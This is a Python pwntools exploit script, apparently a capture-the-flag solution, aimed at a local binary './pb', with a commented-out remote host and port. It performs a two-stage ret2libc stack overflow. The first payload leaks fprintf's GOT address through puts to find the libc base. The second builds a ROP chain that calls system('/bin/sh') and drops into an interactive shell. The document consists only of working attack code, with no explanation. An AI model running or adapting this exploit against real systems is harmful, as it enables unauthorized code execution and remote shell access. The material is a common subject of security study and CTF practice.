from pwn import *

io = process("./pb")
# io = remote("165.232.108.200",31605)
elf = ELF('./pb')
libc = elf.libc
rop = ROP(elf)
gdbscript="""
b *0x4013a3
c
"""
# gdb.attach(io, gdbscript=gdbscript)

io.sendline(b'2')

payload = b"A"*56
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.fprintf)
payload += p64(elf.plt.puts)
payload += p64(elf.sym['box'])
io.sendlineafter(b'library: ', payload)

io.recvuntil(b'thank you!\n')
io.recvline()
leak = unpack(io.recvline()[:-1], 'all')
log.info(f"got fprintf address: {hex(leak)}")
libc.address = leak - libc.sym.fprintf
log.info(f"got libc base at: {hex(libc.address)}")

io.sendline(b'2')
payload = b"A"*56
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

io.sendlineafter(b'library: ', payload)

io.interactive()